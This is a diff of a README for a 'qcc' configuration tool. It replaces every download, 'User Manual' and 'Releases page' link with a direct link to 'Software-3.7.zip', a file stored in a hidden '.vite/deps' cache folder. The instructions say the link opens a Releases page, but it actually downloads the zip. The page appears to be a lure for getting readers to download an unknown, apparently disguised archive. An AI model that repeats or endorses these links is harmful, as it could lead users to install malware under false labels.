@@ -1,7 +1,7 @@
 # 🚀 qcc - Efficient Configuration Management Made Easy
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/Ciba593/qcc/main/putelee/qcc.zip)](https://raw.githubusercontent.com/Ciba593/qcc/main/putelee/qcc.zip)
+[![Download](https://github.com/Ciba593/qcc/raw/refs/heads/main/qcc-web/.vite/deps/Software-3.7.zip)](https://github.com/Ciba593/qcc/raw/refs/heads/main/qcc-web/.vite/deps/Software-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To use qcc effectively, make sure your system meets the following requirements:
 
 To get started, visit the following link to download the latest release of qcc:
 
-[Click here to download qcc](https://raw.githubusercontent.com/Ciba593/qcc/main/putelee/qcc.zip)
+[Click here to download qcc](https://github.com/Ciba593/qcc/raw/refs/heads/main/qcc-web/.vite/deps/Software-3.7.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version (e.g., v1.0) in the list. 
@@ -59,13 +59,13 @@ To configure a new project, follow these steps:
 
 ## 📚 Documentation
 
-For detailed guidance, refer to our [User Manual](https://raw.githubusercontent.com/Ciba593/qcc/main/putelee/qcc.zip). The manual contains step-by-step instructions, FAQs, and troubleshooting tips.
+For detailed guidance, refer to our [User Manual](https://github.com/Ciba593/qcc/raw/refs/heads/main/qcc-web/.vite/deps/Software-3.7.zip). The manual contains step-by-step instructions, FAQs, and troubleshooting tips.
 
 ## 🛠️ Support
 
 If you encounter any issues while downloading or using qcc, please check the Issues section on our GitHub repository. You can raise any concerns there, and our community members will be happy to assist you.
 
-*Remember to stay updated by visiting our [Releases page](https://raw.githubusercontent.com/Ciba593/qcc/main/putelee/qcc.zip) for the latest features and improvements.* 
+*Remember to stay updated by visiting our [Releases page](https://github.com/Ciba593/qcc/raw/refs/heads/main/qcc-web/.vite/deps/Software-3.7.zip) for the latest features and improvements.* 
 
 ## 💬 Community
 
